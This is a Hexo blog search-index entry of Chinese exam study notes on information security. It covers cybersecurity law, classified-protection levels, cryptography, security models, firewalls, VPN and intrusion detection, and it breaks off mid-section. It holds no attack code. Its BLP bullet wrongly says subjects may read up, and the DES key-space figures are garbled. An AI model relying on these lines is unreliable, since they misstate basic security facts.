<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>1</title>
      <link href="2021/11/05/1/"/>
      <url>2021/11/05/1/</url>
      
        <content type="html"><![CDATA[<h1 id="信息安全基础"><a href="#信息安全基础" class="headerlink" title="信息安全基础"></a>信息安全基础</h1><p>重点：法律法规，信息安全管理</p><h2 id="法律法规"><a href="#法律法规" class="headerlink" title="法律法规"></a>法律法规</h2><h3 id="网络安全法"><a href="#网络安全法" class="headerlink" title="网络安全法"></a>网络安全法</h3><ul><li><strong>2015</strong>年初次审议了网络安全法<strong>草案</strong></li><li><strong>2017.6.1施行</strong>网络安全法</li><li><strong>国家网信部门</strong>负责统筹协调网络安全工作和相关监督管理工作。<strong>其他相关部门</strong>在<u><strong>各自职责范围</strong>内负责网络安全保护</u>和监督管理工作。</li><li>相关的网络日志留存不少于<strong>六个月</strong></li><li><strong>国家网信部门</strong>应当统筹协调有关部门<u>加强网络安全信息收集、分析和通报工作</u>，按照规定统一<u>发布网络安全监测预警</u>信息。</li><li>处置重大突发社会安全事件的需要，经<strong>国务院</strong>决定或者批准，可以<u><strong>在特定区域对网络通信采取限制等临时措施</strong></u>。</li><li><strong>网络运营者</strong>拒不改正或者导致危害网络安全等后果的，处<u>一万元以上十万元以下罚款</u>，对<u>直接<strong>负责的主管人员</strong>处五千元以上五万元以下</u>罚款。</li><li><u><strong>关键信息基础设施</strong>的运营者</u>不履行本法第三十三条、第三十四条、第三 十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令 改正，给予警告;拒不改正或者导致危害网络安全等后果的，处<u>十万元以上一百万元以下罚款</u>，对<u>直接负责的主管人员</u>处<strong>一万元以上十万元</strong>以下罚款</li></ul><h3 id="等保"><a href="#等保" class="headerlink" title="等保"></a>等保</h3><ul><li><strong>国家客体是否受到损害，若有直接判定第三级</strong></li><li>损害社会至少二级</li><li>国家受严重损害四级</li><li>国家受特别严重损害五级</li></ul><h3 id="计算机系统安全保护等级"><a href="#计算机系统安全保护等级" class="headerlink" title="计算机系统安全保护等级"></a>计算机系统安全保护等级</h3><p><strong>一自主访控，二唯一标识，三强制访控，四扩展全部，五阻未授权</strong></p><ul><li><strong>一</strong>是用户自主保护级：本级实施的是<strong>自主访问控制</strong>。针对普通用户      </li><li>二是系统审计保护级：身份鉴别通过<strong>为用户提供唯一标识</strong>，使用户对自己的行为负责。针对需要保密的非重要单位</li><li><strong>三</strong>是安全标记保护级：对所有主体及其所控制的客体(例 如:进程、文件、段、设备)<strong>实施强制访问控制</strong>。针对地方各级国家机关、金融单位机构</li><li>四是结构化保护级：在第三级基础上进一步扩展到所<strong>有主体和客体</strong>。用于中央级国家机关、广播电视部门</li><li>五是访问验证保护级：<strong>阻止非授权用户访问客体</strong>。针对国防</li></ul><h3 id="分级保护"><a href="#分级保护" class="headerlink" title="分级保护"></a>分级保护</h3><p>根据其涉密信息系统处理信息的最高密级，可以划分为<strong>秘密级、机密级（增强）、绝密级</strong>三个等级。</p><p><strong>绝密物隔不联网</strong></p><ul><li>秘密级：最高为<strong>秘密级的国家秘密</strong>，其防护水平<strong>不低于国家信息安全等级保护三级</strong>的要求</li><li>机密级：最高为<strong>机密级的国家秘密</strong>，其防护水平<strong>不低于国家信息安全等级保护四级</strong>的要求</li><li>绝密级：最高为<strong>绝密级的国家秘密</strong>，其防护水平<strong>不低于国家信息安全等级保护五级</strong>的要求，还必须符合分级保护的保密技术要求，绝密级信息系统应限定在封闭的安全可控的独立建筑内，<strong>不能与城域网或广域网相连</strong>。</li></ul><h3 id="涉密系统"><a href="#涉密系统" class="headerlink" title="涉密系统"></a>涉密系统</h3><p><strong>重变恢系定，局变回实施</strong></p><p>涉密信息系统在安全运行及维护阶段，当<strong>局部调整等原因导致安全措施变化时</strong>，如果不影响系统的安全分级，应<u>从安全运行及维护阶段进入安全工程实施阶段</u>，重新调整和实施安全措施，确保满足分级保护的要求；当<u>系统发生重大变更</u>影响系统的安全分级时，应<u>从安全运行及维护阶段进入系统定级阶段</u>，重头开始一次分级保护实施过程</p><h2 id="网络隔离"><a href="#网络隔离" class="headerlink" title="网络隔离"></a>网络隔离</h2><p><strong>防火访控，内安不彻排，不连双向，连单向</strong></p><ul><li>网络隔离消除了基于网络和基于协议的安全威胁，但网络隔离技术也存在局限性，对非网络的威胁如<strong>内容安全</strong>，就无法从理论上彻成排除</li><li>防火墙是最常用的网络隔离手段，主要是通过<strong>访问控制列表技术</strong>。</li><li>按国家安全要求是需要<u>涉密网络与非涉密网络互联的时候</u>，要<strong>采用网闸隔离</strong>；若非涉密网络与互联网连通时，采用单向网闸，若非涉密网络与互联网不连通时，采用双向网闸。<ul><li>单向隔离：一方向流通</li><li>双向隔离网闸：关上双方都不能向对方流通</li></ul></li></ul><h2 id="风险评估"><a href="#风险评估" class="headerlink" title="风险评估"></a>风险评估</h2><h3 id="风险评估任务"><a href="#风险评估任务" class="headerlink" title="风险评估任务"></a>风险评估任务</h3><p><strong>看看有什么风险，再看看发生概率有多大，看看自己几斤几两，看看如何风控</strong></p><ul><li>识别风险</li><li>评估风险概率</li><li>确定自身承受风险能力</li><li>确定风险降低政策</li></ul><h3 id="风险评估过程"><a href="#风险评估过程" class="headerlink" title="风险评估过程"></a>风险评估过程</h3><p><strong>看看自己有啥东西和顶不顶得住及有啥风险，请人评估一下，交换意见监督</strong></p><ul><li>资产分析（脆弱性和威胁）</li><li>评估决策</li><li>沟通监督</li></ul><h2 id="风险管理"><a href="#风险管理" class="headerlink" title="风险管理"></a>风险管理</h2><p>风险管理就是以可以接受的费用识别，控制，<strong>降低或消除</strong>可能影响信息系统的安全风险的过程</p><h2 id="信息安全标准"><a href="#信息安全标准" class="headerlink" title="信息安全标准"></a>信息安全标准</h2><p>推荐性国家标准的代号为 “GB/T” ， <strong>强制性</strong>国家标准的代号为”<strong>GB</strong>“。</p><h2 id="信息安全管理"><a href="#信息安全管理" class="headerlink" title="信息安全管理"></a>信息安全管理</h2><h3 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h3><p><strong>协表安对，统智安主</strong></p><ul><li><img src="/2021/11/05/1/image-20211028203439675.png" alt="image-20211028203439675" style="zoom: 50%;"></li></ul><h3 id="人员管理"><a href="#人员管理" class="headerlink" title="人员管理"></a>人员管理</h3><p><strong>法规相关人</strong></p><img src="/2021/11/05/1/image-20211028203600571.png" alt="image-20211028203600571" style="zoom:50%;"><p><img src="/2021/11/05/1/image-20211025204017566.png" alt="image-20211025204017566"></p><p><img src="/2021/11/05/1/image-20211025205455661.png" alt="image-20211025205455661"></p><p><img src="/2021/11/05/1/image-20211025205630385.png" alt="image-20211025205630385"></p><h2 id="分布"><a href="#分布" class="headerlink" title="分布"></a>分布</h2><img src="/2021/11/05/1/image-20211026083708195.png" alt="image-20211026083708195" style="zoom: 50%;"><p><img src="/2021/11/05/1/image-20211026084347852.png" alt="image-20211026084347852"></p><h2 id="法律政策"><a href="#法律政策" class="headerlink" title="法律政策"></a>法律政策</h2><p><img src="/2021/11/05/1/image-20211026104138669.png" alt="image-20211026104138669"></p><h2 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h2><p><img src="/2021/11/05/1/image-20211026104724817.png" alt="image-20211026104724817"></p><p>ccrc</p><p><img src="/2021/11/05/1/image-20211026104841283.png" alt="image-20211026104841283"></p><p>b，应该是及时发现</p><h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><p>SM，SHA系列，DES,RSA,AES，分组密码工作模式，公钥体制概念，数字签名概念体制，认证概念，身份认证，非对称密钥管理</p><h4 id="SM"><a href="#SM" class="headerlink" title="SM"></a>SM</h4><img src="/2021/11/05/1/image-20211028102049850.png" alt="image-20211028102049850" style="zoom: 67%;"><h4 id="SHA"><a href="#SHA" class="headerlink" title="SHA"></a>SHA</h4><p><img src="/2021/11/05/1/image-20211030115856890.png" alt="image-20211030115856890"></p><h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><p><a href="https://www.cnblogs.com/songwenlong/p/5944139.html">DES算法详解 - songoo - 博客园 (cnblogs.com)</a></p><img src="/2021/11/05/1/image-20211028211858608.png" alt="image-20211028211858608" style="zoom: 67%;"><p><img src="/2021/11/05/1/image-20211026212518598.png" alt="image-20211026212518598"></p><h4 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h4><img src="/2021/11/05/1/image-20211027102311343.png" alt="image-20211027102311343" style="zoom:33%;"><h4 id="初始置换ip"><a href="#初始置换ip" class="headerlink" title="初始置换ip"></a>初始置换ip</h4><p><img src="/2021/11/05/1/image-20211027153258845.png" alt="image-20211027153258845"></p><p>DES 算法的安全性： </p><p>密钥较短：DES 采用 <strong>56</strong> 位密钥，其密钥量仅为 256 约为 1017 个。 </p><p>存在弱密钥： 弱密钥 K：K1=K2=…=K16；弱密钥不受任何循环移位的影响，并且只能得到相同的子密钥，存在 <strong>4</strong> 个弱密钥。 </p><p>半弱密钥 K：DES 至少存在 <strong>12</strong> 个半弱密钥。半弱密钥将<strong>导致把明文加密成相同的密文</strong>。</p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><ul><li>密钥长度一般<strong>1024</strong>位，平台根密钥<strong>2048</strong>位</li></ul><p><img src="/2021/11/05/1/image-20211026213114059.png" alt="image-20211026213114059"></p><h4 id="计算方法"><a href="#计算方法" class="headerlink" title="计算方法"></a>计算方法</h4><p><img src="/2021/11/05/1/image-20211028092729740.png" alt="image-20211028092729740"></p><h4 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h4><p><img src="/2021/11/05/1/image-20211028092753563.png" alt="image-20211028092753563"></p><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><p>是分组密码，也是对称密码</p><p><img src="/2021/11/05/1/image-20211030112045750.png" alt="image-20211030112045750"></p><p><img src="/2021/11/05/1/image-20211026212815201.png" alt="image-20211026212815201"></p><h4 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h4><p><img src="/2021/11/05/1/image-20211030110704153.png" alt="image-20211030110704153"></p><h4 id="圈密钥"><a href="#圈密钥" class="headerlink" title="圈密钥"></a>圈密钥</h4><p><img src="/2021/11/05/1/image-20211030111712815.png" alt="image-20211030111712815"></p><h3 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h3><p>IDEA(<strong>International Data Encryption Algorithm</strong>)</p><p><img src="/2021/11/05/1/image-20211026212721256.png" alt="image-20211026212721256"></p><h3 id="分组密码工作模式"><a href="#分组密码工作模式" class="headerlink" title="分组密码工作模式"></a>分组密码工作模式</h3><ul><li>ECB:明文分块后依次独立加密，可并行，但是会泄露明文的结构消息。<ul><li><img src="/2021/11/05/1/image-20211030121532237.png" alt="image-20211030121532237" style="zoom:50%;"></li></ul></li><li>OFB:与CFB模式的区别在于每次将加密器的输出(而不是密文)反馈给下一块加密器<ul><li><img src="/2021/11/05/1/image-20211030120926154.png" alt="image-20211030120926154" style="zoom:50%;"></li><li>错误传播有界（错误只影响一位），不可并行。</li></ul></li><li>CFB:将密文反馈给下一块加密器<ul><li><img src="/2021/11/05/1/image-20211030120953611.png" alt="image-20211030120953611" style="zoom:50%;"></li><li>自同步强，但是只有一个IV，可能影响安全性，明文的一个错误会影响后面所有的密文，加密不可并行，解密可并行</li></ul></li><li>CTR:<strong>计数器值不同</strong>。CTR模式也可以用于随机存取。<ul><li><img src="/2021/11/05/1/image-20211030121641086.png" alt="image-20211030121641086" style="zoom:50%;"></li><li>错误传播有界，可并行</li></ul></li><li>CBC:每一个<strong>明文块与前一个密文块进行异或</strong>后在进行加密操作。第一个块需要初始向量IV<ul><li><img src="/2021/11/05/1/image-20211030122345026.png" alt="image-20211030122345026" style="zoom: 67%;"></li></ul></li><li>PCBC:与CBC模式类似，只是在加解密时，<strong>与上一个密文和上一个明文进行异或</strong><ul><li><img src="/2021/11/05/1/image-20211030122533506.png" alt="image-20211030122533506" style="zoom: 67%;"></li><li>串行加密，下一个依赖上一个</li></ul></li></ul><h3 id="密码体制概念"><a href="#密码体制概念" class="headerlink" title="密码体制概念"></a>密码体制概念</h3><ul><li>一个密钥很容易推出另一个成为对称密码</li><li><strong>不能由一个密钥推出另一个密钥即使公开也很安全的叫公钥密码体制</strong></li></ul><h3 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h3><ul><li>置换密码：原来的字母变换位置</li><li>代替密码：原位置的密码用密文字母表中字母代替<ul><li>仿射，乘法，加法密码</li></ul></li></ul><img src="/2021/11/05/1/image-20211028205730249.png" alt="image-20211028205730249" style="zoom:50%;"><h3 id="无线局域网产品的密码算法"><a href="#无线局域网产品的密码算法" class="headerlink" title="无线局域网产品的密码算法"></a><strong>无线局域网产品的密码算法</strong></h3><ul><li><strong>对称密码算法 SM4</strong>；</li><li><strong>签名算法 ECDSA</strong>；</li><li><strong>密钥协商算法 ECDH</strong>；</li><li><strong>杂凑算法 SHA-256</strong>；</li></ul><h3 id="密码安全性分析"><a href="#密码安全性分析" class="headerlink" title="密码安全性分析"></a>密码安全性分析</h3><img src="/2021/11/05/1/image-20211027095241093.png" alt="image-20211027095241093" style="zoom: 50%;"><img src="/2021/11/05/1/image-20211026211730305.png" alt="image-20211026211730305" style="zoom:50%;"><h3 id="国产密码算法"><a href="#国产密码算法" class="headerlink" title="国产密码算法"></a>国产密码算法</h3><p><img src="/2021/11/05/1/image-20211028091112296.png" alt="image-20211028091112296"></p><h3 id="HASH函数"><a href="#HASH函数" class="headerlink" title="HASH函数"></a>HASH函数</h3><p><strong>错检</strong>，<strong>单抗性</strong></p><p>Hash 函数将任意长的报文 M 映射为定长的 hash 码 h，其形式为：<strong>h=H（M）</strong> </p><p>Hash 也称为报文摘要，具有<strong>错误检测</strong>能力</p><p>基本性质： </p><p>单向性：由 Hash 码不能得出相应的报文； </p><p><strong>抗弱碰撞性</strong>：不能找到相同 Hash 值的不同报文；对于任意给定的分块x，找到满足y≠x且H(x)=H(y)的y在计算上是不可行的 </p><p><strong>抗强碰撞性</strong>：抵抗生日攻击这类攻击的能力强弱问题。Hash 函数值应该较长。找到任何满足H(x)=H(y)的偶对(x,y)在计算上是不可行的</p><p>如果一个Hash函数是<strong>抗强碰撞的，那么同时也是抗弱碰撞的</strong></p><h4 id="HASH算法"><a href="#HASH算法" class="headerlink" title="HASH算法"></a>HASH算法</h4><p>全都以<strong>512位为一组</strong></p><ul><li>MD5摘要128位</li><li>SHA一般160位摘要，SHA 算法产生的哈希值长度有 SHA-224、SHA-<strong>256</strong>、SHA-384、SHA-512。</li><li><strong>SM3</strong> 是我国<strong>商用</strong>密码<strong>杂凑</strong>算法，杂凑值长度为 <strong>256</strong> 比特。</li></ul><h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p><strong>不可否认真实可鉴</strong></p><ul><li><p>数字签名体制包括：<strong>施加签名</strong>和<strong>验证签名</strong>。</p></li><li><p><img src="/2021/11/05/1/image-20211030124832474.png" alt="image-20211030124832474"></p></li><li><p>数字签名至少应满足以下三个条件： </p><p>不可否认。签名者事后不能否认自己的签名。 </p><p>真实性。接收者能验证签名，而任何其他人都不能伪造签名。 </p><p>可鉴别性。当双方关于签名的真伪发生争执时，第三方能解决双方之间发生的争执。</p></li></ul><h3 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h3><p><strong>个机设签加</strong></p><ul><li><p>按类别分：个人，机构，设备证书</p></li><li><p>按用途分：签名，加密证书</p><ul><li><p>签名证书<strong>用于证明签名公钥</strong>的数字证书； </p><p>加密证书用于证明加密公钥的数字证书。</p></li></ul></li></ul><h3 id="安全协议"><a href="#安全协议" class="headerlink" title="安全协议"></a>安全协议</h3><h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><p><strong>加认完</strong>,<strong>传认连</strong></p><ul><li><p>由 SSH <strong>传输</strong>层协议、SSH <strong>用户认证</strong>协议和 SSH <strong>连接协议</strong>三个子协议组成</p></li><li><p>SSH 能支持远程登录（Telnet）、<strong>rsh、rlogin</strong>、scp等多种安全服务。</p></li><li><p>提供加密、认证、完整性检查等多种安全服务</p></li><li><p>服务器公钥真实性认证方法</p><ul><li>PKI</li><li>下载服务器的公钥和hash，用hash工具生成新的hash和下载的hash比较，相同则是真实的</li></ul></li></ul><h4 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h4><h3 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h3><h4 id="和数字签名区别"><a href="#和数字签名区别" class="headerlink" title="和数字签名区别"></a>和数字签名区别</h4><ul><li>认证公开信息基于<strong>双方</strong>都知道的秘密，数字签名验证数据完全公开</li><li>数字签名具有抗抵赖性，第三方能仲裁</li><li>认证不允许第三方参加</li></ul><h3 id="密钥管理"><a href="#密钥管理" class="headerlink" title="密钥管理"></a>密钥管理</h3><ul><li>初级密钥：直接用于加密数据的，一次一密，生存周期很短</li><li>二级密钥：保护初级密钥，需要专职密钥安装员，生存周期一般较长</li><li>主密钥：保护上两级密钥，需要密钥专职人员，生存周期长</li></ul><h3 id="密码学网络安全应用"><a href="#密码学网络安全应用" class="headerlink" title="密码学网络安全应用"></a>密码学网络安全应用</h3><ul><li>路由器<ul><li>SSH代替telnet</li><li>用 <strong>MD5-HMAC</strong>实现<strong>信息交换认证</strong></li><li>路由口令先用MD5计算在保存到配置文件</li></ul></li><li>SSH,SSL用于数据传输，都是传输层协议</li><li>数字签名用于保护真实，完整性</li><li>数字证书身份鉴别</li></ul><h1 id="网络安全体系"><a href="#网络安全体系" class="headerlink" title="网络安全体系"></a>网络安全体系</h1><h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><ul><li><img src="/2021/11/05/1/image-20211030160033929.png" alt="image-20211030160033929" style="zoom: 67%;">- 协同：多种安全机制协作配合- 整体：各个单元按照一定规则形成一体化的保护- 过程：提供一种**过程式保护机制**- 全面：基于多维度，层面- 适应：动态适应安全需求</li></ul><h2 id="安全模型"><a href="#安全模型" class="headerlink" title="安全模型"></a>安全模型</h2><h3 id="BLP-机密性模型"><a href="#BLP-机密性模型" class="headerlink" title="BLP 机密性模型"></a>BLP 机密性模型</h3><p><strong>上写下读BLP</strong></p><ul><li>用于军事，保护机密性</li><li>简单安全特性：主体能向上<strong>读</strong></li><li>*特性：主体只能向<strong>上写</strong>，不能向下写</li></ul><h3 id="BIBA完整性模型"><a href="#BIBA完整性模型" class="headerlink" title="BIBA完整性模型"></a>BIBA完整性模型</h3><p><strong>下写上读</strong>,完整性级别不够不能调别人</p><ul><li>保护<strong>完整性</strong></li><li>简单安全特性：不能下读</li><li>*特性：主体不能向<strong>上写</strong></li><li>调用特性：主体的完整性级别小于另外一个主体时，不能调用另一个主体。</li></ul><h3 id="信息流模型"><a href="#信息流模型" class="headerlink" title="信息流模型"></a>信息流模型</h3><ul><li>访问控制模型的一种变形，简称FM</li><li>一个安全的 FM 当且仅当执行系列操作后，<strong>不会导致流与流关系→产生冲突</strong>。</li></ul><h3 id="信息保障模型PDRR"><a href="#信息保障模型PDRR" class="headerlink" title="信息保障模型PDRR"></a>信息保障模型PDRR</h3><ul><li>保护，检测，响应，恢复</li></ul><h3 id="能力成熟度模型"><a href="#能力成熟度模型" class="headerlink" title="能力成熟度模型"></a>能力成熟度模型</h3><p>CMM是对组织能力进行成熟度评估的模型</p><img src="/2021/11/05/1/image-20211030170847099.png" alt="image-20211030170847099" style="zoom:67%;"><h3 id="纵深防御模型"><a href="#纵深防御模型" class="headerlink" title="纵深防御模型"></a>纵深防御模型</h3><p><strong>保监响恢</strong></p><p>将信息网络安全防护措施有机组合起来，形成多道保护线，各安全防护措施能够互相支持和补救，<strong>尽可能地阻断</strong>攻击者的威胁。</p><p>•安全保护 </p><p>•安全监测 </p><p>•实时响应 </p><p>•恢复</p><h3 id="分层防护模型"><a href="#分层防护模型" class="headerlink" title="分层防护模型"></a>分层防护模型</h3><p>分层防护模型针对<strong>单独保护节点</strong>。</p><h3 id="网络生存模型"><a href="#网络生存模型" class="headerlink" title="网络生存模型"></a>网络生存模型</h3><p>网络生存性是指在网络信息系统<strong>遭受入侵</strong>的情形下，网络信息系统<strong>仍然能够持续提供必要服务的能力</strong>。</p><h2 id="网络安全原则"><a href="#网络安全原则" class="headerlink" title="网络安全原则"></a>网络安全原则</h2><img src="/2021/11/05/1/image-20211030172309333.png" alt="image-20211030172309333" style="zoom:67%;"><h1 id="物理与环境安全技术"><a href="#物理与环境安全技术" class="headerlink" title="物理与环境安全技术"></a>物理与环境安全技术</h1><h2 id="硬件木马检测"><a href="#硬件木马检测" class="headerlink" title="硬件木马检测"></a>硬件木马检测</h2><p><strong>反功侧</strong></p><ul><li>反向，功耗，侧信道分析</li></ul><h1 id="认证技术原理与应用"><a href="#认证技术原理与应用" class="headerlink" title="认证技术原理与应用"></a>认证技术原理与应用</h1><h2 id="口令认证"><a href="#口令认证" class="headerlink" title="口令认证"></a>口令认证</h2><ul><li>不用弱口令</li><li>加密存储安全传输</li><li>符合安全协议</li></ul><h2 id="Kerberos-认证技术"><a href="#Kerberos-认证技术" class="headerlink" title="Kerberos 认证技术"></a><strong>Kerberos</strong> <strong>认证技术</strong></h2><img src="/2021/11/05/1/image-20211031140301905.png" alt="image-20211031140301905" style="zoom:50%;"><ul><li>TGT就相当于key，拿到后干嘛都可以</li></ul><h2 id="公钥基础设施（PKI）技术"><a href="#公钥基础设施（PKI）技术" class="headerlink" title="公钥基础设施（PKI）技术"></a>公钥基础设施（PKI）技术</h2><p><strong>CA签管撤</strong></p><ul><li>签证机构CA：负责签发证书、管理和撤销证书</li><li>注册机构RA：负责专门<strong>受理用户申请</strong>证书的机构 证书的签发 <strong>证书目录</strong> 证书的认证 证书的撤销 信任模型</li></ul><h2 id="单点登录"><a href="#单点登录" class="headerlink" title="单点登录"></a>单点登录</h2><p>用户访问使用不同的系统时，只需要<strong>一次身份认证</strong>，就可以根据这次登录的认证身份访问授权资源。</p><h2 id="认证技术指标"><a href="#认证技术指标" class="headerlink" title="认证技术指标"></a>认证技术指标</h2><ul><li>密码算法</li><li>认证准确性</li><li>安全保障级别</li><li>支持用户量</li></ul><h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ul><li>防止非法用户</li><li>禁止合法用户非法使用（越权）</li></ul><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><ol><li><strong>主体</strong>。对客体的操作实施者。</li><li><strong>客体</strong>。被主体操作的对象。</li><li><strong>参考监视器</strong>。<strong>访问控制中决策单元与执行单元的集合体</strong>。控制主体对客体的操作，监督访问行为，记录安全事件至审计文件。</li><li><strong>访问控制数据库</strong>。记录主体访问客体的<strong>权限</strong>及其<strong>访问方式</strong>的信息，提供访问控制决策判断的依据，也称<strong>访问控制策略库</strong>。</li><li><strong>审计库</strong>。存储主体访问客体的操作信息。</li></ol><h2 id="访问控制类型"><a href="#访问控制类型" class="headerlink" title="访问控制类型"></a>访问控制类型</h2><img src="/2021/11/05/1/image-20211025202134577.png" alt="image-20211025202134577" style="zoom: 50%;"><ul><li>自主访控DAC：基于<strong>自己的安全策略</strong>授予访问权</li><li>强制访控MAC：系统根据<strong>主客体的安全属性</strong>控制访问</li><li>基于<strong>角色</strong>RBAC：根据<strong>任务</strong>授予权限</li><li>基于<strong>属性</strong>ABAC：根据<strong>主客体属性</strong>和其他条件授权主体请求操作</li></ul><h2 id="口令管理"><a href="#口令管理" class="headerlink" title="口令管理"></a>口令管理</h2><ul><li>至少<strong>8</strong>位大小写特殊符号</li><li>不用默认口令</li><li>登录次数限制</li><li>口令文件加密存放root才能读取</li><li>口令时效定期改</li></ul><h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><p>逻辑隔离外部和内部网络</p><h2 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h2><ul><li>内部威胁</li><li>受限于安全规则</li><li>不能完全防止感染病毒的软件，文件传输</li></ul><h2 id="防火墙实现技术"><a href="#防火墙实现技术" class="headerlink" title="防火墙实现技术"></a>防火墙实现技术</h2><img src="/2021/11/05/1/image-20211031160628880.png" alt="image-20211031160628880" style="zoom:50%;"><h4 id="包过滤"><a href="#包过滤" class="headerlink" title="包过滤"></a>包过滤</h4><ul><li>在ip层实现</li><li><img src="/2021/11/05/1/image-20211031153541904.png" alt="image-20211031153541904" style="zoom:50%;"></li><li>脆弱面：<ul><li>ip欺骗：ip伪装成内部的</li><li>tcp/ip协议栈攻击</li><li>源路由攻击</li><li>微分片</li></ul></li></ul><h4 id="状态检测"><a href="#状态检测" class="headerlink" title="状态检测"></a>状态检测</h4><p>利用防火墙已经<strong>验证通过的连接，建立一个临时的状态表</strong>。当一个新的数据包到达防火墙，首先<strong>检查是否在状态表</strong>中。如果在，则允许通过:不<strong>在，则采用包过滤技术</strong>进行检查。</p><h4 id="应用层网关"><a href="#应用层网关" class="headerlink" title="应用层网关"></a>应用层网关</h4><p>应用层网关也叫做代理服务器。可以<strong>实现基于内容的信息过滤</strong>。但是每开通一种服务，就必须在防火墙上<strong>添加相应的服务进程</strong>，<strong>对用户的透明性低</strong>，不太适合实时性要求太高的服务。</p><h4 id="电路层网关"><a href="#电路层网关" class="headerlink" title="电路层网关"></a>电路层网关</h4><ul><li>电路层网关<u>不允许</u>一个<u>端到端</u>的直接的 TCP 连接，它自网关建立两个 TCP 连接，一个 连接网关与网络内部的 TCP 用户，一个连接网关与网络外部的 TCP 用户。</li><li>电路层网关的协议有 <strong>SOCKS</strong>，客户端希望与目标的建立连接时，首先必须建立与 SOCKS 服务。</li></ul><h4 id="防火墙技术名称"><a href="#防火墙技术名称" class="headerlink" title="防火墙技术名称"></a>防火墙技术名称</h4><img src="/2021/11/05/1/image-20211031160904754.png" alt="image-20211031160904754" style="zoom:50%;"><p>关键技术</p><ul><li>协议分析</li><li>深度包检测<ul><li>检测包头和内容</li></ul></li></ul><h2 id="防火墙体系结构"><a href="#防火墙体系结构" class="headerlink" title="防火墙体系结构"></a>防火墙体系结构</h2><ul><li>堡垒主机 BastionHost) :堡垒主机是指直接面对外部用户攻击的主机系统。</li><li>双重宿主主机: 双重宿主主机是指<strong>至少拥有两个网络接口的计算机</strong>，<strong>一个接口接内部网，一个接口接外部网</strong>。</li><li>周边网络 (DMZ): 介于外网和内网之间。 一般来说，对外提供服务的各种服务器都可以放在这个网络里，<strong>使得外部用户访问服务器时不需要进入内部网络</strong></li></ul><h3 id="防御结构类型"><a href="#防御结构类型" class="headerlink" title="防御结构类型"></a>防御结构类型</h3><ul><li><strong>双重宿主主机</strong>：以<strong>一台双重宿主主机</strong>作为<strong>防火墙系统的主体</strong>，<strong>执行分离外部网络与内部网络的任务</strong>。</li><li><strong>被屏蔽主机</strong>：<strong>一个路由器</strong>和内部网络上的<strong>堡垒主机</strong>共同构成防火墙。</li><li><strong>被屏蔽子网</strong>：<strong>两台路由器</strong>包围起来的<strong>周边网络</strong>，并且将容易受到攻击的堡垒主机都置于这个周边网络中。</li><li><strong>内部路由器</strong>：内部路由器用于**<u>隔离</u>周边网络和内部网络<strong>，是屏蔽子网体系结构的第二道屏障。在其上设置了</strong>针对内部用户的访问过滤规划**</li><li><strong>外部路由器</strong>：外部路由器的主要作用在于**<u>保护</u>周边网络和内部网络<strong>，是屏蔽子网体系结构的第一道屏障。在其上设置了</strong>对周边网络和内部网络进行访问的过滤规<strong>则，该规则</strong>主要针对外网用户**。</li><li><ul><li><img src="/2021/11/05/1/image-20211031161935550.png" alt="image-20211031161935550" style="zoom:50%;"></li></ul></li></ul><h3 id="防火墙技术应用"><a href="#防火墙技术应用" class="headerlink" title="防火墙技术应用"></a>防火墙技术应用</h3><ul><li>划分区域</li><li>设置访问控制点</li><li>制订边界安全策略</li><li>选择防火墙技术和结构</li><li>配置安全策略</li><li>验证测试安全策略</li><li>运维</li></ul><h1 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h1><h2 id="VPN-技术应用"><a href="#VPN-技术应用" class="headerlink" title="VPN 技术应用"></a><strong>VPN</strong> <strong>技术应用</strong></h2><img src="/2021/11/05/1/image-20211031163632002.png" alt="image-20211031163632002" style="zoom:50%;"><h2 id="VPN-安全服务"><a href="#VPN-安全服务" class="headerlink" title="VPN 安全服务"></a>VPN 安全服务</h2><p><strong>保完认</strong></p><ul><li>保密性服务 </li><li>完整性服务 </li><li>认证服务</li></ul><h1 id="入侵检测CIDR"><a href="#入侵检测CIDR" class="headerlink" title="入侵检测CIDR"></a>入侵检测CIDR</h1><p>protection：保护</p><p>detection：检测</p><p>由事件产生器,事件分析器,响应单元,事件数据库组成。</p><ul><li><p>入侵检测技术 <strong>IDS</strong>注重的是网络安全状况的<strong>监管</strong>，寻找违反安全策略的行为，并发出报警。因此绝大多数 IDS 系统都是被动的。</p></li><li><p>入侵防护系统 <strong>IPS</strong>则倾向于提供<strong>主动防护</strong>，注重对入侵行为的控制。</p></li></ul><h2 id="入侵检测技术"><a href="#入侵检测技术" class="headerlink" title="入侵检测技术"></a>入侵检测技术</h2><h3 id="基于误用的入侵检测技术"><a href="#基于误用的入侵检测技术" class="headerlink" title="基于误用的入侵检测技术"></a><strong>基于误用的入侵检测技术</strong></h3><ul><li><strong>根据已知的入侵模式</strong>检测入侵行为。<ul><li><img src="/2021/11/05/1/image-20211031164257791.png" alt="image-20211031164257791" style="zoom:50%;"></li></ul></li></ul><h3 id="基于异常的入侵检测技术"><a href="#基于异常的入侵检测技术" class="headerlink" 